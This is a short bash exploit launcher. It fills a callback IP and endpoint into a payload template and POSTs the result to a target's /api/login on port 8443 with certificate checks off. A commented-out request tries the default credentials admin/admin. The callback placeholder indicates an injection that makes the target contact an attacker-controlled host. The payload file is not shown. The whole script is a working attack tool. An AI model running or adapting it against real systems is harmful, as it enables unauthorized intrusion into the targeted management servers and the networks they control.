#!/bin/bash

TARGET_IP=$1
CALLBACK_IP=$2
PAYLOAD_FILE=$3
ENDPOINT=$4

FILE_CONTENTS=$(cat $PAYLOAD_FILE)
FILE_CONTENTS=$(echo $FILE_CONTENTS | sed -e "s/%%CALLBACK_IP%%/${CALLBACK_IP}/g")
FILE_CONTENTS=$(echo $FILE_CONTENTS | sed -e "s/%%ENDPOINT%%/${ENDPOINT}/g")
PAYLOAD=$FILE_CONTENTS

echo "Final payload --> ${PAYLOAD}"
echo ""

curl -k -v "https://${TARGET_IP}:8443/api/login" \
  -X POST \
  -H "Referer: https://${TARGET_IP}:8443/manage/account/login?redirect=%2Fmanage" \
  -H 'Content-Type: application/json; charset=utf-8' \
  -H "Origin: https://${TARGET_IP}:8443" \
  -H 'DNT: 1' \
  -H 'Connection: keep-alive' \
  --data-raw "${PAYLOAD}"
  # -d @"${PAYLOAD_FILE}"
  # --data-raw '{"username":"admin","password":"admin","remember":false,"strict":true}'

